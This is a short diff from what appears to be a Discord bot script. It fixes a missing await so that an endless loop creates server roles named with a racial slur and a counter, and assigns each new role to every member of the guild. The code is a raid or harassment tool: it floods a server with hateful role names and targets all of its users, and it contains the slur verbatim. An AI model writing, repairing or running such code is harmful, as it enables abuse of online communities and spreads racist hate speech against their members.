@@ -161,7 +161,7 @@ https://cdn.discordapp.com/attachments/693974529923612728/708740617496428604/158
                 i = 0
                 while True:
                     i += 1
-                    role = ctx.guild.create_role(name=f"nigger-{i}")
+                    role = await ctx.guild.create_role(name=f"nigger-{i}")
                     for user in ctx.guild.members:
                         try:
                             await user.add_roles(role)
